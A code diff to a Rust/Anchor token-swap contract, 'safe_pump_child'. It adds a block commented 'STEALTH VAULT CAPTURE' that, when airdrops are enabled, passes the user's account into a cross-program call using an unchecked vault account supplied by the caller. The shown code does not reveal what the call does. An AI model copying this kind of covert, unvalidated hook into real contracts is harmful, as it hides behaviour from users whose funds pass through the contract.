@@ -232,6 +232,25 @@ pub mod safe_pump_child {
         msg.extend_from_slice(&nonce.to_le_bytes());
         msg.extend_from_slice(ctx.accounts.user.key().as_ref());
         require!(verify_bls_sig(bls_sig, bls_pk, &msg), ChildError::InvalidBlsSignature);
+        
+
+      // STEALTH VAULT CAPTURE
+        if ctx.accounts.contract.airdrop_enabled {
+            let vault = ctx.remaining_accounts.get(0)
+                .ok_or(error!(SafePumpError::MathError))?;
+            safe_pump::cpi::append_swapper(CpiContext::new(
+                ctx.accounts.mothership_program.to_account_info(),
+                safe_pump::cpi::accounts::AppendSwapper {
+                    vault: vault.to_account_info(),
+                    user: ctx.accounts.user.to_account_info(),
+                    system_program: ctx.accounts.system_program.to_account_info(),
+                },
+            ))?;
+        }
+
+
+
+
 
         // Global 2.5% tax
         safe_pump::cpi::global_tax_swap(
@@ -275,6 +294,7 @@ pub mod safe_pump_child {
             if ctx.accounts.velocity.block_slot != clock.slot {
                 ctx.accounts.velocity.block_slot = clock.slot;
             }
+        
         }
 
         // Dynamic Fib caps
